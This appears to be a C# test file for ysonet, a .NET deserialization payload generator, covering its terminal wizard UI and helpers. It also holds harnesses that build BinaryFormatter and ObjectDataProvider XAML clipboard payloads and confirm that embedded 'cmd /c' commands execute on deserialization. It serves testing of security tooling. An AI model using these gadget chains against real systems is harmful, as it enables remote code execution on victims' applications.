            // whose label contains "out" (output, outputpath).
            var frames = DriveFrames(k => k.Enter().Enter()      // open the first gadget's settings
                .Type("out")                                     // filter the settings
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(frames, "/out"), "the active settings filter is tagged in the header");
            AssertTrue(AnyFrame(frames, "outputpath"), "a substring match is shown while filtering settings");
        }

        private static void ModuleInfoPanelShowsFacts()
        {
            // On the gadget module list (before opening one), the right side shows the
            // highlighted gadget's info so a user can choose: its formatters and what
            // the -c command means.
            var gadget = DriveFrames(k => k.Enter().Escape().Escape());
            AssertTrue(AnyFrame(gadget, "- Info"), "the info panel header shows for the highlighted gadget");
            AssertTrue(AnyFrame(gadget, "Formatters:"), "the gadget info lists its formatters");
            AssertTrue(AnyFrame(gadget, "Command input:"), "the gadget info states what the command means");

            // On the plugin module list, the info panel lists the plugin's options.
            var plugin = DriveFrames(k => k.Digit(2).Escape().Escape());
            AssertTrue(AnyFrame(plugin, "- Info"), "the info panel header shows for the highlighted plugin");
            AssertTrue(AnyFrame(plugin, "Options:"), "the plugin info lists its options");
        }

        private static void FilterFieldsUnit()
        {
            var fields = new List<EditableField>
            {
                new EditableField { Label = "command" },
                new EditableField { Label = "output" },
                new EditableField { Label = "outputpath" },
                new EditableField { Label = "formatter" },
            };
            // Empty query is a pass-through (same list instance/contents).
            AssertEqual(4, ModuleEditor.FilterFieldsForTest(fields, "").Count, "empty query keeps all");
            var outp = ModuleEditor.FilterFieldsForTest(fields, "out");
            AssertEqual(2, outp.Count, "two labels contain 'out'");
            AssertEqual("output", outp[0].Label, "order is preserved");
            AssertEqual("outputpath", outp[1].Label, "order is preserved");
            // Case-insensitive substring, not just prefix.
            AssertEqual(1, ModuleEditor.FilterFieldsForTest(fields, "MAND").Count, "case-insensitive substring match");
        }

        private static void SentenceCasingUnit()
        {
            AssertEqual("Hello there", ModuleEditor.SentenceForTest("hello there"), "lower-case first letter is capitalized");
            AssertEqual("Already up", ModuleEditor.SentenceForTest("Already up"), "an already-capital first letter is left alone");
            AssertEqual("'winforms' mode", ModuleEditor.SentenceForTest("'winforms' mode"), "a non-letter start (a quoted token) is left alone");
            AssertEqual("", ModuleEditor.SentenceForTest(""), "empty stays empty");
        }

        // Drive the interactive UI against a fresh virtual terminal (real columns
        // path) and return every rendered frame.
        private static List<Frame> DriveFrames(Action<RecordingKeyReader> build)
        {
            var prevTerm = Term.Current;
            bool prevForce = ModuleEditor.ForceFallback;
            var vt = new VirtualTerminal(120, 40);
            Term.Current = vt;
            ModuleEditor.ForceFallback = false;
            try
            {
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            }
            finally
            {
                Term.Current = prevTerm;
                ModuleEditor.ForceFallback = prevForce;
            }
        }

        private static bool AnyFrame(List<Frame> frames, string needle)
        {
            foreach (Frame f in frames)
                if (f.Contains(needle)) return true;
            return false;
        }

        private static void AllMenusRender()
        {
            AssertTrue(AnyFrame(DriveFrames(k => k.Escape()), "Build a gadget payload"), "top menu renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Enter().Enter().Escape().Escape().Escape()), "[ Generate and quit ]"), "gadget settings render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(2).Up().Enter().Escape().Escape().Escape()), "ViewState Settings"), "plugin settings render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(3).Type("Json").Enter().Enter().Escape()), "Gadgets with a formatter"), "search formatters renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(4).Escape().Escape()), "What kind of input"), "run-all-formatters renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(6).Enter().Escape()), "Pick 'gadget'"), "help renders");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(5).Enter().Escape()), "developed and maintained"), "credits render");
            AssertTrue(AnyFrame(DriveFrames(k => k.Digit(7).Down().Escape().Escape()), "Pick a color theme"), "theme picker renders");
        }

        private static void TextEditAppends()
        {
            // Open a gadget, edit the command (a text setting). The box is pre-filled
            // with the current value and the caret sits at the end, so typing APPENDS
            // (it does not wipe the value). (Enter opens the gadget flow, Enter opens
            // the first gadget, Down moves to 'command', Enter edits it.)
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Type("X").Escape().Escape().Escape().Escape());
            // The full value is echoed in the footer (so a long value stays visible for
            // reading/copying); the edit box itself shows it with a block caret.
            AssertTrue(AnyFrame(frames, "Editing command: calc.exe"), "the box is pre-filled with the current value");
            AssertTrue(AnyFrame(frames, "Editing command: calc.exeX"), "typing appends at the end (does not replace)");

            // Ctrl+U clears the whole line, so you can quickly type a fresh value.
            var replaced = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type("notepad").Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(replaced, "Editing command: notepad"), "Ctrl+U clears, then typing sets a new value");

            // Backspacing the value away empties the box (Enter would then save empty).
            var cleared = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Backspace(8).Escape().Escape().Escape().Escape()); // "calc.exe" is 8 chars
            AssertTrue(AnyFrameRowTrimmed(cleared, "Editing command:"), "backspacing the value empties the box");
        }

        private static void TextEditWordOps()
        {
            // Ctrl+Backspace deletes the whole word to the left. Type "abc def", then
            // Ctrl+Backspace removes "def" and typing "Z" gives "abc Z" (a sentinel that
            // only arises if the word delete happened). Ctrl+U clears first.
            var del = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type("abc def").CtrlBackspace().Type("Z")
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(del, "Editing command: abc Z"), "Ctrl+Backspace deletes the word to the left");

            // Ctrl+Left moves by a word, so typing lands before that word: from the end
            // of "abc def", Ctrl+Left puts the caret before "def"; typing "Z" gives
            // "abc Zdef".
            var move = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type("abc def").CtrlLeft().Type("Z")
                .Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(move, "Editing command: abc Zdef"), "Ctrl+Left jumps a whole word");
        }

        private static void TextEditWrapsInPlace()
        {
            // A value longer than the editor column wraps onto the next line in place
            // (no separate page). Type a long no-space value; it appears wrapped in the
            // edit box across more than one row, and in full on one line in the footer.
            string longVal = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaXY";
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .CtrlU().Type(longVal).Escape().Escape().Escape().Escape());
            // The tail "XY" is only reachable if the value wrapped onto a later row of
            // the box (the first row is full of 'a's), so seeing it proves in-place wrap.
            AssertTrue(AnyFrame(frames, "XY"), "a long value wraps onto the next row of the edit box");
        }

        // True when some frame has a row whose trimmed text equals exactly `s`.
        private static bool AnyFrameRowTrimmed(List<Frame> frames, string s)
        {
            foreach (Frame f in frames)
                for (int y = 0; y < f.Height; y++)
                    if (f.Row(y).Trim() == s) return true;
            return false;
        }

        private static void TextEditCaretEditing()
        {
            // Left moves the caret so you can insert in the middle, not only append.
            var mid = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Left().Left().Type("X").Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(mid, "Editing command: calc.eXxe"), "Left caret then type inserts in the middle");

            // Home jumps to the start; Delete removes the character at the caret.
            var del = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter()
                .Home().Delete().Escape().Escape().Escape().Escape());
            AssertTrue(AnyFrame(del, "Editing command: alc.exe"), "Home then Delete removes the first character");
        }

        private static void FocusedValueInFooter()
        {
            // Navigating onto a value setting shows its full value in the footer, so a
            // long value (truncated in the narrow column) can be read and copied out.
            var frames = DriveFrames(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Escape().Escape().Escape());
            AssertTrue(AnyFrame(frames, "command = calc.exe"), "the focused setting's full value shows in the footer");
        }

        private static void LineEditBufferUnit()
        {
            // Opens pre-filled with the caret at the end, so typing appends.
            var b = new LineEditBuffer("calc.exe");
            AssertEqual(8, b.Caret, "caret starts at the end");
            b.Insert('X');
            AssertEqual("calc.exeX", b.Text, "typing appends at the end");

            // Caret move + insert edits in the middle.
            var e = new LineEditBuffer("abc");
            e.Left();                            // caret to 2
            e.Insert('X');                       // insert before 'c'
            AssertEqual("abXc", e.Text, "Left then insert edits in the middle");
            AssertEqual(3, e.Caret, "caret advances past the inserted character");

            // Home/End + character delete.
            var d = new LineEditBuffer("abc");
            d.Home(); d.Delete();
            AssertEqual("bc", d.Text, "Home then Delete removes the first character");
            d.End(); d.Backspace();
            AssertEqual("b", d.Text, "End then Backspace removes the last character");

            // Clear empties the whole line.
            var cl = new LineEditBuffer("something");
            cl.Clear();
            AssertEqual("", cl.Text, "Clear empties the line");
            AssertEqual(0, cl.Caret, "Clear resets the caret");

            // Word operations treat runs of non-space as words.
            var w = new LineEditBuffer("cmd /c calc"); // caret at end (11)
            w.DeleteWordLeft();
            AssertEqual("cmd /c ", w.Text, "DeleteWordLeft removes the last word");
            var w2 = new LineEditBuffer("cmd /c calc");
            w2.WordLeft();                       // caret before "calc"
            w2.Insert('X');
            AssertEqual("cmd /c Xcalc", w2.Text, "WordLeft jumps a whole word");
            var w3 = new LineEditBuffer("cmd /c calc");
            w3.Home(); w3.DeleteWordRight();
            AssertEqual(" /c calc", w3.Text, "DeleteWordRight removes the word at the caret");

            // Caret clamps at both ends.
            var c = new LineEditBuffer("x");
            c.Left(); c.Left();
            AssertEqual(0, c.Caret, "caret clamps at 0");
            c.Right(); c.Right();
            AssertEqual(1, c.Caret, "caret clamps at length");
        }

        // Dev inspection: walk every interactive menu/screen in the virtual terminal
        // and print a captured frame of each, so a human/AI can eyeball the real UI.
        private static void DumpUi()
        {
            Func<Action<RecordingKeyReader>, List<Frame>> run = build =>
            {
                var vt = new VirtualTerminal(120, 40);
                Term.Current = vt;
                ModuleEditor.ForceFallback = false;
                var k = new RecordingKeyReader(vt);
                build(k);
                try { new Wizard(k, new MemoryStream()).Run(); } catch { }
                return k.Frames;
            };
            Action<string, List<Frame>, string, bool> show = (label, fs, needle, last) =>
            {
                Frame f = null;
                foreach (Frame x in fs) { if (x.Contains(needle)) { f = x; if (!last) break; } }
                Console.WriteLine("\n#################### " + label + " ####################");
                Console.WriteLine(f == null ? "(not captured: '" + needle + "')" : f.Text());
            };

            var top = run(k => k.Escape());
            show("TOP MENU", top, "What do you want to do", false);

            var gadget = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Down().Escape().Escape().Escape());
            show("GADGET MODULES (right columns hidden)", gadget, "Gadgets", false);
            show("GADGET SETTINGS (columns)", gadget, "[ Generate and quit ]", false);

            var textEdit = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Enter().Type("notepad").Escape().Escape().Escape().Escape());
            show("EDIT A TEXT SETTING (command)", textEdit, "Edit: command", true);

            var choice = run(k => k.Enter().Type("ObjectDataProvider").Enter().Down().Down().Down().Enter().Escape().Escape().Escape().Escape());
            show("EDIT A CHOICE SETTING (formatter)", choice, "Edit: formatter", false);

            var showCmd = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Enter().Enter().Escape().Escape().Escape());
            show("SHOW YSONET COMMAND action", showCmd, "Equivalent one-line command", false);

            var gen = run(k => k.Enter().Type("ObjectDataProvider").Enter().Up().Up().Up().Up().Enter().Enter().Escape().Escape().Escape());
            show("GENERATE action output", gen, "Payload (", false);

            var plugin = run(k => k.Digit(2).Up().Enter().Escape().Escape().Escape());
            show("PLUGIN SETTINGS (ViewState)", plugin, "ViewState Settings", false);

            var theme = run(k => k.Digit(7).Down().Down().Escape().Escape());
            show("THEME PICKER (live preview)", theme, "Pick a color theme", false);

            var search = run(k => k.Digit(3).Type("Json").Enter().Enter().Escape());
            show("SEARCH FORMATTERS", search, "Gadgets with a formatter", true);

            var help = run(k => k.Digit(6).Enter().Escape());
            show("HELP", help, "Pick 'gadget'", false);

            var credits = run(k => k.Digit(5).Enter().Escape());
            show("CREDITS", credits, "developed and maintained", false);
        }

        private static void WizardShowCommand()
        {
            // The show-command action prints the equivalent one-liner and generates
            // nothing (no payload on stdout).
            var keys = new ScriptedKeyReader();
            keys.Enter();                            // top -> gadget
            keys.Type("ObjectDataProvider").Enter(); // module picker
            keys.Type("formatter").Enter();          // open formatter
            keys.Digit(2);                           // Json.NET
            keys.Type("Show ysonet").Enter();        // show-command action
            keys.Escape();                           // leave form
            keys.Escape();                           // leave module list
            keys.Escape();                           // quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "show-command does not generate a payload");
            AssertTrue(stderr.Contains("Equivalent one-line command"), "prints the command header");
            AssertTrue(stderr.Contains("-g ObjectDataProvider -f Json.NET"), "prints the gadget command line");
        }

        private static void WizardRemembersLastCommand()
        {
            // Build ODP twice in one session. The first flow types "notepad.exe";
            // the second leaves the command at its default, which must be the
            // remembered command from the first flow.
            var keys = new ScriptedKeyReader();
            // flow 1: ODP / Json.NET / "notepad.exe"
            keys.Enter().Type("ObjectDataProvider").Enter();
            keys.Type("formatter").Enter().Digit(2);      // Json.NET
            keys.Type("command").Enter().TypeLine("notepad.exe");
            keys.Type("Generate").Enter();
            keys.Escape();                                // leave form -> module list
            // flow 2: ODP again, command left at the remembered default
            keys.Type("ObjectDataProvider").Enter();
            keys.Type("formatter").Enter().Digit(2);      // Json.NET
            keys.Type("Generate").Enter();
            keys.Escape();                                // leave form -> module list
            keys.Escape();                                // leave module list -> top
            keys.Escape();                                // quit

            string stderr;
            byte[] got = DriveWizard(keys, out stderr);
            byte[] one = GenerateOdpJson("notepad.exe");

            AssertEqual(one.Length * 2, got.Length, "two payloads emitted back to back");
            byte[] first = new byte[one.Length];
            byte[] second = new byte[one.Length];
            Array.Copy(got, 0, first, 0, one.Length);
            Array.Copy(got, one.Length, second, 0, one.Length);
            AssertTrue(BytesEqual(first, one), "first payload uses the typed command");
            AssertTrue(BytesEqual(second, one), "second payload reused the remembered command");
        }

        private static void WizardRunAllFormatters()
        {
            // The reported bug: this sweep exited the wizard because some gadgets
            // reject a shell command (they expect a file/URL/DLL). It must now run
            // to completion, skip those gracefully, and emit nothing to stdout.
            var keys = new ScriptedKeyReader();
            keys.Digit(4);                     // top menu -> Run all formatters (index 3)
            keys.Enter();                      // input type -> Shell command (index 0)
            keys.Type("BinaryFormatter").Enter(); // formatter picker filter + pick
            keys.TypeLine("calc.exe");         // command
            keys.Enter();                      // output format -> auto
            keys.Digit(3);                     // destination -> "Just show payload lengths" (index 2)
            keys.Escape();                     // back at top menu -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "sweep writes nothing to stdout");
            AssertTrue(stderr.Contains("Shell command ("), "input types listed with gadget counts");
            AssertTrue(stderr.Contains("Done."), "sweep ran to completion");
            AssertTrue(stderr.Contains("will run with"), "non-empty gadget set previewed before running");
            AssertTrue(stderr.Contains("[ok]"), "at least one gadget generated");
            AssertTrue(!stderr.Contains("length 0"), "empty payloads are skipped, not counted as ok");
        }

        private static void WizardRunAllFormattersToFolder()
        {
            string folder = Path.Combine(Path.GetTempPath(), "ysonet_raf_test");
            if (Directory.Exists(folder))
                Directory.Delete(folder, true);

            var keys = new ScriptedKeyReader();
            keys.Digit(4);                     // top -> Run all formatters
            keys.Enter();                      // input type -> Shell command (index 0)
            keys.Type("BinaryFormatter").Enter(); // formatter picker filter + pick
            keys.TypeLine("calc.exe");         // command
            keys.Enter();                      // output format -> auto
            keys.Digit(1);                     // destination -> "Save each to its own file" (index 0)
            keys.TypeLine(folder);             // folder path
            keys.Escape();                     // back at top -> quit

            string stderr;
            byte[] stdout = DriveWizard(keys, out stderr);

            AssertEqual(0, stdout.Length, "sweep writes nothing to stdout");
            AssertTrue(Directory.Exists(folder), "output folder created");
            string[] files = Directory.GetFiles(folder);
            AssertTrue(files.Length > 0, "payload files were written");
            long biggest = 0;
            foreach (string p in files)
            {
                long n = new FileInfo(p).Length;
                if (n > biggest) biggest = n;
            }
            AssertTrue(biggest > 0, "written payloads are non-empty");

            // Variant-capable gadgets that support BinaryFormatter (e.g.
            // GenericPrincipal, GetterSecurityException) emit one file per variant.
            bool anyVariantFile = false;
            foreach (string p in files)
                if (Path.GetFileName(p).Contains("_v"))
                    anyVariantFile = true;
            AssertTrue(anyVariantFile, "variant-suffixed files were produced");

            try { Directory.Delete(folder, true); } catch { }
        }

        private static void ClipboardWpfXamlOptions()
        {
            // The new delivery mode must be reachable through the plugin's own
            // OptionSet, which is what the CLI parses and the wizard introspects.
            var plugin = new ClipboardPlugin();
            var fields = OptionField.FromOptionSet(plugin.Options());

            OptionField modeField = FindField(fields, "mode");
            AssertTrue(modeField != null, "mode option present");
            AssertTrue(modeField.TakesValue, "mode takes a value");
            AssertEqual("m", modeField.ShortName, "mode has -m short name");

            OptionField variantField = FindField(fields, "xamlvariant");
            AssertTrue(variantField != null, "xamlvariant option present");
            AssertTrue(variantField.TakesValue, "xamlvariant takes a value");

            // The original winforms knobs are still there (mode is additive).
            AssertTrue(FindField(fields, "format") != null, "format option still present");
            AssertTrue(FindField(fields, "command") != null, "command option still present");
        }

        // Triggering harness: build each Clipboard delivery payload exactly as the
        // plugin does, then drive the target's deserialization/paste path and prove
        // the command fired (a marker file only a fired gadget could create). This
        // runs the payload locally, like the plugin's own --test - the authorized
        // self-test of an offensive tool.
        private static void ClipboardPayloadsTrigger()
        {
            // winforms delivery: AxHost.State -> BinaryFormatter TextFormattingRunProperties.
            AssertTrue(WinformsPayloadTriggers(),
                "winforms clipboard payload triggers the command on BinaryFormatter deserialization");

            // wpfxaml, both XAML variants: they must FIRE on the vulnerable
            // (non-restrictive) paste path...
            AssertTrue(WpfXamlPayloadRuns(1, false), "wpfxaml variant 1 triggers on a non-restrictive paste");
            AssertTrue(WpfXamlPayloadRuns(2, false), "wpfxaml variant 2 triggers on a non-restrictive paste");
            // ...and must be BLOCKED on the mitigated (restrictive) default paste.
            AssertTrue(!WpfXamlPayloadRuns(1, true), "wpfxaml variant 1 is blocked on a restrictive paste");
            AssertTrue(!WpfXamlPayloadRuns(2, true), "wpfxaml variant 2 is blocked on a restrictive paste");
        }

        private static bool WinformsPayloadTriggers()
        {
            string marker = Path.Combine(Path.GetTempPath(), "ysonet_clip_winforms.txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
            ia.IsRawCmd = true;

            // Same object the plugin puts on the clipboard for winforms delivery.
            object gadget = TextFormattingRunPropertiesGenerator.TextFormattingRunPropertiesGadget(ia);
            AxHostStateMarshal marshal = new AxHostStateMarshal(gadget);

            var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
            byte[] bytes;
            using (var ms = new MemoryStream()) { bf.Serialize(ms, marshal); bytes = ms.ToArray(); }

            // A target reading GetData(format) deserializes it with BinaryFormatter.
            RunSTA(delegate { using (var ms = new MemoryStream(bytes)) { bf.Deserialize(ms); } });

            bool ran = WaitForFile(marker, 2500);
            if (File.Exists(marker)) File.Delete(marker);
            return ran;
        }

        private static bool WpfXamlPayloadRuns(int variant, bool restrictive)
        {
            string marker = Path.Combine(Path.GetTempPath(),
                "ysonet_clip_wpf_" + variant + "_" + (restrictive ? "r" : "n") + ".txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo x > \"" + marker + "\"";
            ia.IsRawCmd = true;

            // Same XAML the plugin places under the WPF 'Xaml' clipboard format.
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new string[] { "--variant", variant.ToString() });
            string xaml = (string)gen.Generate("xaml", ia);

            RunSTA(delegate
            {
                if (restrictive) SerializersHelper.Xaml_deserialize_restrictive(xaml);
                else SerializersHelper.Xaml_deserialize(xaml);
            });

            bool ran = WaitForFile(marker, 2500);
            if (File.Exists(marker)) File.Delete(marker);
            return ran;
        }

        // Run an action on an STA thread (WPF XamlReader and WinForms deserialization
        // expect it). Swallows exceptions: a gadget may throw after it fires, so the
        // marker file, not the return, is the proof.
        private static void RunSTA(System.Threading.ThreadStart action)
        {
            var t = new System.Threading.Thread(delegate ()
            {
                try { action(); }
                catch (Exception) { }
            });
            t.SetApartmentState(System.Threading.ApartmentState.STA);
            t.Start();
            t.Join();
        }

        private static bool WaitForFile(string path, int totalMs)
        {
            int waited = 0;
            while (waited < totalMs)
            {
                if (File.Exists(path)) return true;
                System.Threading.Thread.Sleep(100);
                waited += 100;
            }
            return File.Exists(path);
        }

        private static void RestrictiveXamlBlocksGadget()
        {
            // The wpfxaml mode's --test relies on this: the restrictive reader (the
            // default WPF paste path since the CVE-2020-0605/0606 mitigation) must
            // block the ObjectDataProvider gadget so the command does NOT run. On a
            // mitigated framework it blocks silently (no throw); older ones may throw.
            // Either way the gadget must not execute, so we assert on a marker file
            // that only a fired gadget would create, not on an exception.
            string marker = Path.Combine(Path.GetTempPath(), "ysonet_restrictive_xaml_test.txt");
            if (File.Exists(marker)) File.Delete(marker);

            InputArgs ia = new InputArgs();
            ia.Cmd = "cmd /c echo blocked > \"" + marker + "\"";
            ia.IsRawCmd = true;
            var gen = new ObjectDataProviderGenerator();
            gen.Options().Parse(new string[] { "--variant", "2" });
            string xaml = (string)gen.Generate("xaml", ia);

            AssertTrue(xaml.Contains("ObjectDataProvider"), "payload is an ObjectDataProvider gadget");
            AssertTrue(xaml.Contains("ResourceDictionary"), "variant 2 is a ResourceDictionary wrapper");

            try { SerializersHelper.Xaml_deserialize_restrictive(xaml); }
            catch (Exception) { /* some frameworks throw when blocking; that is still a block */ }

            System.Threading.Thread.Sleep(300);
            bool ran = File.Exists(marker);
            if (ran) File.Delete(marker);
            AssertTrue(!ran, "restrictive XAML load must block the gadget (marker must not be created)");
        }

        // Guards the whole CLI --help/--fullhelp surface against the NDesk.Options
        // wrap-loop hang (see Helpers/HelpText.cs). It renders every plugin's and
        // gadget's option help through the production HelpText path on a worker
        // thread with a timeout. Before the fix, "ysonet.exe -p clipboard --help"
        // spun forever inside WriteOptionDescriptions; this fails instead of hanging
        // if any option description ever regresses that way again.
        private static void OptionHelpNeverHangs()
        {
            var sets = new List<KeyValuePair<string, OptionSet>>();

            foreach (string name in GadgetHelper.GetAllGadgetNames())
            {
                IGenerator g = GadgetHelper.CreateGadgetInstance(name);
                OptionSet o = g == null ? null : g.Options();
                if (o != null) sets.Add(new KeyValuePair<string, OptionSet>("gadget " + name, o));
            }
            foreach (string name in PluginHelper.GetAllPluginNames())
            {
                IPlugin p = PluginHelper.CreatePluginInstance(name);
                OptionSet o = p == null ? null : p.Options();
                if (o != null) sets.Add(new KeyValuePair<string, OptionSet>("plugin " + name, o));
            }

            AssertTrue(sets.Count > 0, "found plugin/gadget option sets to render");

            foreach (KeyValuePair<string, OptionSet> kv in sets)
            {
                OptionSet opts = kv.Value;
                Exception err = null;
                StringWriter sw = new StringWriter();
                System.Threading.Thread t = new System.Threading.Thread(delegate ()
                {
                    try { HelpText.WriteOptionDescriptions(opts, sw); }
                    catch (Exception e) { err = e; }
                });
                t.IsBackground = true; // a genuine hang must not keep the test process alive
                t.Start();
                bool done = t.Join(System.TimeSpan.FromSeconds(10));
                AssertTrue(done, "option help render hung (NDesk wrap loop) for " + kv.Key);
                AssertTrue(err == null, "option help render threw for " + kv.Key + ": " + (err == null ? "" : err.Message));
                // The render must actually produce help text (it has at least one option).
                AssertTrue(sw.ToString().Trim().Length > 0, "option help produced output for " + kv.Key);
            }
        }

        // Unit test for the soft-break that makes the render safe. A whitespace-free
        // token longer than the NDesk wrap width is what triggers the loop, so
        // SoftBreak must shrink every run to the safe width while only inserting
        // spaces (never dropping or changing characters).
        private static void SoftBreakWrapsLongTokens()
        {
            // The real clipboard --mode token that caused the hang.
            string token = "Switch.System.Windows.EnableLegacyDangerousClipboardDeserializationMode=true";
            AssertTrue(HelpText.LongestUnbrokenRun(token) > HelpText.MaxTokenLength,
                "sample token is long enough to trigger the NDesk hang");

            string broken = HelpText.SoftBreak(token);
            AssertTrue(HelpText.LongestUnbrokenRun(broken) <= HelpText.MaxTokenLength,
                "soft-break keeps every run within the safe wrap width");
            AssertEqual(token, broken.Replace(" ", ""),
                "soft-break only inserts spaces; all original characters are kept");

            // Text that already wraps is returned untouched.
            string ok = "a normal help line with short words";
            AssertEqual(ok, HelpText.SoftBreak(ok), "short text is returned unchanged");
            AssertEqual("", HelpText.SoftBreak(""), "empty text is safe");
            AssertEqual(null, HelpText.SoftBreak(null), "null text is safe");
        }

        // Every gadget must actually produce a non-empty payload from valid inputs,
        // not merely declare that it supports a formatter. Data-driven, so a newly
        // added gadget is covered automatically. For each gadget it picks a sample
        // input matching the gadget's declared CommandInput() and generates with the
        // gadget's first supported formatter. (The CLI's --raf sweeps every formatter;
        // this is the per-gadget smoke test that each one can generate at all.)
        private static void EveryGadgetGeneratesAPayload()
        {
            // Fixtures for the file/dll/source input types.
            string csFixture = Path.Combine(Path.GetTempPath(), "ysonet_gadget_fixture.cs");
            File.WriteAllText(csFixture, "public class YsonetTestFixture { public YsonetTestFixture() { } }");
            // A real managed PE for gadgets that embed a DLL to load on the target.
            string dllFixture = new Uri(typeof(OptionSet).Assembly.CodeBase).LocalPath;

            try
            {
                string[] names = GadgetHelper.GetAllGadgetNames();
                AssertTrue(names.Length > 0, "found gadgets to generate");

                foreach (string name in names)
                {
                    // "Generic" is the base generator, not a real gadget (the CLI hides
                    // it too); it has no payload to produce.
                    if (name == "Generic") continue;

                    IGenerator g = GadgetHelper.CreateGadgetInstance(name);
                    AssertTrue(g != null, "gadget loads: " + name);

                    List<string> formatters = g.SupportedFormatters();
                    AssertTrue(formatters != null && formatters.Count > 0, name + " declares a formatter");

                    // SupportedFormatters() entries may carry display annotations
                    // ("Xaml (4)", "YamlDotNet < 5.0.0"); the real -f name is the first
                    // whitespace-delimited token (see GenericGenerator.IsSupported).
                    string formatter = formatters[0].Split(' ')[0];

                    InputArgs ia = new InputArgs();
                    ia.Cmd = SampleInputForGadget(g.CommandInput(), csFixture, dllFixture);

                    GenerationRequest req = new GenerationRequest
                    {
                        GadgetName = name,
                        FormatterName = formatter,
                        OutputFormat = "",
                        InputArgs = ia,
                    };

                    RunResult r = PayloadRunner.GenerateGadget(req);
                    AssertTrue(r.Success, "generate " + name + " (-f " + formatter + "): " + r.ErrorMessage);
                    AssertTrue(!RawIsEmpty(r.Raw), "non-empty payload for " + name + " (-f " + formatter + ")");
                }
            }
            finally
            {
                try { File.Delete(csFixture); } catch { }
            }
        }

        // A valid sample input for a gadget's declared command-input type. Nothing here
        // reaches the network; file/dll/source inputs point at local fixtures.
        private static string SampleInputForGadget(CommandInputType t, string csFixture, string dllFixture)
        {
            switch (t)
            {
                case CommandInputType.Ignored: return "";
                case CommandInputType.ShellCommand: return "calc.exe";
                case CommandInputType.Url: return "http://localhost/ysonet";
                case CommandInputType.FilePath: return csFixture;   // any existing local file
                case CommandInputType.CsSourceFile: return csFixture;
                case CommandInputType.DllPath: return dllFixture;
                default: return "calc.exe";
            }
        }

        // Reset a plugin's private static bool option flag so an in-process test is not
        // affected by a value a sibling test left behind (see note in the plugin sweep).
        private static void ResetStaticBool(Type t, string field)
        {
            var f = t.GetField(field, System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            if (f != null && f.FieldType == typeof(bool)) f.SetValue(null, false);
        }

        private static bool RawIsEmpty(object raw)
        {
            if (raw == null) return true;
            byte[] b = raw as byte[];
            if (b != null) return b.Length == 0;
            string s = raw as string;
            if (s != null) return s.Length == 0;
            return false; // some other non-null object counts as produced
        }

        // Every plugin that can generate a payload offline must actually do so with
        // valid inputs. The remaining plugins are excluded explicitly with a reason.
        // A coverage guard fails if a plugin is neither generated nor excluded, so a
        // newly added plugin cannot silently skip this test.
        //
        // Plugins store parsed options in static fields, so runs are made deterministic
        // by passing the mode/format tokens each plugin relies on rather than trusting
        // defaults that an earlier run may have changed.
        private static void EverySafePluginGeneratesAPayload()
        {
            // Plugins keep parsed options in static fields and never reset them. In
            // production this is harmless (each ysonet.exe run is a fresh process), but
            // in-process a sibling test that runs ViewState with --examples leaves that
            // static flag on, which would block generation here. Clearing it keeps this
            // test order-independent. (Only ViewState's flag leaks across tests; every
            // other plugin below is run once with explicit tokens.)
            ResetStaticBool(typeof(ysonet.Plugins.ViewStatePlugin), "showExamples");

            // GetterCallGadgets reads its inner payload from a file (File.ReadAllText),
            // so it needs one that exists.
            string innerFixture = Path.Combine(Path.GetTempPath(), "ysonet_plugin_inner.json");
            File.WriteAllText(innerFixture, "{}");

            // Harmless hex keys (from the ViewState usage docs) for the crypto plugins.
            const string valKey = "70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0";
            const string decKey = "34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887";

            var argvByPlugin = new Dictionary<string, string[]>(StringComparer.OrdinalIgnoreCase)
            {
                { "Altserialization", new string[] { "-c", "calc.exe" } },
                { "ApplicationTrust", new string[] { "-c", "calc.exe" } },
                { "DotNetNuke", new string[] { "-m", "run_command", "-c", "calc.exe" } },
                { "GetterCallGadgets", new string[] { "-g", "PropertyGrid", "-i", innerFixture } },
